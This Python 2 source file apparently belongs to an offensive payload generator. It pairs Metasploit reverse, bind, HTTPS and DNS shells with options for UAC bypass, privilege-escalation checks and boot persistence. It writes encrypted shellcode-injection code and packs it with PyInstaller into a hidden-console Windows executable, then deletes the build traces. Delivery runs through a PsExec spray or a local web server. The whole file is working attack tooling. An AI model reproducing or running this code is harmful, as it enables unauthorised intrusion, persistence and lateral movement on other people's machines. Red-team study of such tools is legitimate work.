from main import *
from payloadextras import *
from psexecspray import *
from startmetasploit import *
from generatepayload import *
from menu import *
from encrypt import *
from stager import *


METASPLOIT_Functions = {
    'reverse': {
        'uacbypass': METASPLOIT().metrev_uac,
        'allchecks': METASPLOIT().metrev_allchecks,
        'persistence': METASPLOIT().metrev_persistence,
        'normal': METASPLOIT().metrev_normal
    },
    'bind': {
        'uacbypass': METASPLOIT().metbind_uac,
        'allchecks': METASPLOIT().metbind_allchecks,
        'persistence': METASPLOIT().metbind_persistence,
        'normal': METASPLOIT().metbind_normal
    },
    'https': {
        'uacbypass': METASPLOIT().methttps_uac,
        'allchecks': METASPLOIT().methttps_allchecks,
        'persistence': METASPLOIT().methttps_persistence,
        'normal': METASPLOIT().methttps_normal
    },
    'dns': {
        'uacbypass': METASPLOIT().metdns_uac,
        'allchecks': METASPLOIT().metdns_allchecks,
        'persistence': METASPLOIT().metdns_persistence,
        'normal': METASPLOIT().metdns_normal
    },
    'nclistener': {
        'nclisten': METASPLOIT().nclisterner,
    }
}
def askAndReturnModules(shellcode, metasploit_type):
    if metasploit_type == 'nclistener':
        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['nclisten'])
    else:
        want_UACBYPASS = raw_input(t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)?' + t.bold_red + ' y/[n]:' + t.normal)
        if want_UACBYPASS.lower() == 'y':
            win7orwin10 = raw_input(t.bold_red + '[*] Windows 7 or 10?' + t.bold_red + ' 7/[10]:' + t.normal)
            if not win7orwin10:
                win7orwin10 = "10"
            return (EXTRAS(shellcode).UACBYPASS(win7orwin10), METASPLOIT_Functions[metasploit_type]['uacbypass'])

        want_ALLCHECKS = raw_input(t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
        if want_ALLCHECKS.lower() == 'y':
            return (EXTRAS(shellcode).ALLCHECKS(), METASPLOIT_Functions[metasploit_type]['allchecks'])

        want_PERSISTENCE = raw_input(t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
        if want_PERSISTENCE.lower() == 'y':
            return (EXTRAS(shellcode).PERSISTENCE(), METASPLOIT_Functions[metasploit_type]['persistence'])

        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])

def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
    with open('%s/payload.py' % payloaddir(), 'w+') as Filesave:
        Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
        Filesave.close()
    print '[*] Creating Payload using Pyinstaller...'

    randomenckey = ''.join(random.sample(string.ascii_lowercase, 16))

    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
                          '%s/payload.py' % payloaddir(), '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    LOADING = Spinner('Generating Payload')
    while p.poll() == None:
        LOADING.Update()
        time.sleep(0.2)
    print '\r',
    sys.stdout.flush()

    payloadstderr = p.stderr.read()
    if len(sys.argv) > 1:
        if sys.argv[1] == "-debug":
            sys.stdout.write(payloadstderr)
    os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir(),payloadname))
    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), payloadname) + t.normal
    CleanUpPayloadMess(payloadname)
    from menu import clientMenuOptions
    if len(clientMenuOptions.keys()) > 2:
        from stager import clientUpload
        clientUpload((payloaddir() + '/' + payloadname), powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}')
    else:
        DoPayloadUpload(payloadname)


def CleanUpPayloadMess(payloadname):
    os.system('rm dist -r')
    os.system('rm build -r')
    os.system('rm *.spec')
    os.system('rm %s/payload.py' % payloaddir())

def DoPayloadUpload(payloadname):
    want_to_upload = raw_input(
        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
        DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
    elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir(), port=8000, printIt = True)
